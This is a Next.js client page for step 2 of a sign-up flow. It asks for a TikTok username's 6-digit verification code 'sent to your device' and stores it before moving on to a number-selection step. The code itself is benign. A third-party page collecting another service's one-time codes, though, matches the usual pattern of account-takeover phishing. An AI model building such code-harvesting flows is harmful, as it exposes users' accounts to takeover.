
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, ArrowRight, KeyRound, Loader2 } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage } from '@/components/ui/form';
import { useSubmission } from '@/hooks/use-submission-context';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import { useEffect } from 'react';

const formSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function VerifyCodePage() {
    const router = useRouter();
    const { submission, setSubmission } = useSubmission();

     useEffect(() => {
        // If the user hasn't entered a username, send them back to the start
        if (!submission.tiktokUsername) {
            router.replace('/start');
        }
    }, [submission.tiktokUsername, router]);

    const form = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: {
            verificationCode: submission.verificationCode || "",
        }
    });

    const onSubmit = (values: FormValues) => {
        setSubmission(prev => ({ ...prev, verificationCode: values.verificationCode }));
        router.push('/start/select-number');
    };

    return (
        <div className="w-full max-w-lg">
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <KeyRound className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 2: Verification Code</h1>
                <p className="text-muted-foreground">Enter the 6-digit code sent to your device.</p>
            </div>

            <Progress value={50} className="w-[80%] mx-auto mb-8" />
            
            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="verificationCode"
                        render={({ field }) => (
                            <FormItem>
                            <FormControl>
                                <div className="flex justify-center">
                                <InputOTP maxLength={6} {...field}>
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                </InputOTP>
                                </div>
                            </FormControl>
                            <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />
                    
                    <div className="flex justify-between">
                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                        <Button type="submit" size="lg" className="rounded-full">
                            Continue
                            <ArrowRight className="ml-2 h-5 w-5" />
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}
